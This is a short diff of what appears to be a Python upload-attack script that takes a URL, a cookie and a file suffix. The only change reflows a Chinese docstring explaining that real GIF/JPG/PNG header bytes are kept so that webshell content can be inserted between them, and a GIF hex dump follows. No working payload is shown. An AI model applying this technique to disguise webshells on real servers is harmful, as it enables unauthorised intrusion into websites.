@@ -275,7 +275,10 @@ args = parser.parse_args()
 url = args.url
 cookie = args.cookie
 script_suffix = args.suffix
-"""gif_file_content,jpg_file_content,png_file_content都是从正常的对应文件的16进制中抽取的前2行和最后2行的16进制数据,如果要插入webshell内容则最好在第2行之后第3行之前
+"""
+gif_file_content,jpg_file_content,png_file_content都是从正常的对应文件的16进制中
+抽取的前2行和最后2行的16进制数据,如果要插入webshell内容则最好在第2行之后第3行之前
+
 gif_file_content = '''
 00000000: 4749 4638 3961 c800 c800 f700 0000 0000  GIF89a..........
 00000010: 0000 3900 0041 0000 3100 0008 0000 2900  ..9..A..1.....).
